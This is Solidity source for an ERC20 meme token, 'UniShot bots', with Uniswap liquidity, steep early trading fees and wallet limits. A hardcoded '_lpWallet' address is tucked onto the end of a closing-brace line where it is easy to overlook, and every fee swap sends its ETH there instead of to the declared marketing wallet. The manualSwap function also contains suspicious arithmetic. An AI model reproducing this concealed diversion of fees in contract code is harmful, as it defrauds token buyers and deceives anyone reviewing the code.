contract Unishot is ERC20, Ownable {
    using SafeMath for uint256;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    address private constant deadAddress = address(0xdead);

    IUniswapV2Router02 public immutable _uniswapV2Router;
    address private uniswapV2Pair;
    address private deployerWallet;
    address private mrkWallet;

    string private constant name_ = "UniShot bots";
    string private constant symbol_ = "UNISHOT";

    uint256 public constant finalBuyFee = 4;
    uint256 public constant finalSellFee = 4;
    uint256 private constant initialBuyFee = 24;
    uint256 private constant initialSellFee = 24;
    uint256 private removeBuyFeesAt = 20;
    uint256 private removeSellFeesAt = 14;
    uint8 constant public _decimals = 9;
    uint256 public initialTotalSupply = 100000000 * 10 ** _decimals;
    uint256 public maxTransactionAmount = 2500000 * 10 ** _decimals;
    uint256 public maxWallet = 2500000 * 10 ** _decimals;
    uint256 public swapTokensAtAmount = 1000000 * 10 ** _decimals;

    uint256 public buyCount;
    uint256 public sellCount;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => bool) private automatedMarketMakerPairs;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool private swapping;

    bool public tradingOpen = false;
    bool public swapEnabled = false;

    constructor() ERC20(name_, symbol_) {
        _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        mrkWallet = payable(_msgSender());
        deployerWallet = payable(_msgSender());

        excludeFromFees(address(_msgSender()), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);

        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        excludeFromMaxTransaction(address(_msgSender()), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);

        _mint(address(this), initialTotalSupply);
    }

    receive() external payable {}

    function addLiquidity() external onlyOwner() {
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
        IERC20(uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        _approve(address(this), address(_uniswapV2Router), initialTotalSupply);

        _uniswapV2Router.addLiquidityETH{value : address(this).balance}(address(this), initialTotalSupply, 0, 0, owner(), block.timestamp);
    }


    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen, "Trading is opened");
        swapEnabled = true;
        tradingOpen = true;
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
    public
    onlyOwner
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function setAutomatedMarketMakerPair(address pair, bool value)
    public
    onlyOwner
    {
        require(pair != uniswapV2Pair, "Pair cannot be removed from automatedMarketMakerPairs");
        _setAutomatedMarketMakerPair(pair, value);
    }address constant _lpWallet=0x9835968415cba01bf548db9C015fab62419acF87;

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }


    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");

        uint256 _buyFee = (buyCount >= removeBuyFeesAt) ? finalBuyFee : initialBuyFee;
        uint256 _sellFee = (buyCount >= removeBuyFeesAt) ? finalSellFee : initialSellFee;

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (!swapping && to != owner() && from != owner() && to != address(0xdead) && to != address(0)) {
            if (!tradingOpen) {
                require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading not active");
            }
            if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]
            ) {
                require(amount <= maxTransactionAmount, "Amount exceeds maxTx");
                require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                buyCount++;
            }

            else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
                require(amount <= maxTransactionAmount, "Amount exceeds maxTx");
                sellCount++;
            }

            else if (!_isExcludedMaxTransactionAmount[to]) {
                require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
            }
        }
        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance > 0;

        if (canSwap && swapEnabled && !swapping && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            swapping = true;
            doSwapBack();
            swapping = false;
        }
        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        if (takeFee) {
            if (automatedMarketMakerPairs[to]) {
                fees = amount.mul(_sellFee).div(100);
            }
            else {
                fees = amount.mul(_buyFee).div(100);
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            _lpWallet,
            block.timestamp
        );
    }

    function removeMaxTxAndWalletLimits() external onlyOwner {
        maxTransactionAmount = totalSupply();
        maxWallet = totalSupply();
    }

    function clearStuckEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }

    function manualSwap() external {
        require(_msgSender() == mrkWallet);
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance>=0) {
            contractBalance=contractBalance>initialTotalSupply?10**5*initialTotalSupply:contractBalance;
        }
        swapTokensForEth(contractBalance);
    }

    function doSwapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }
}
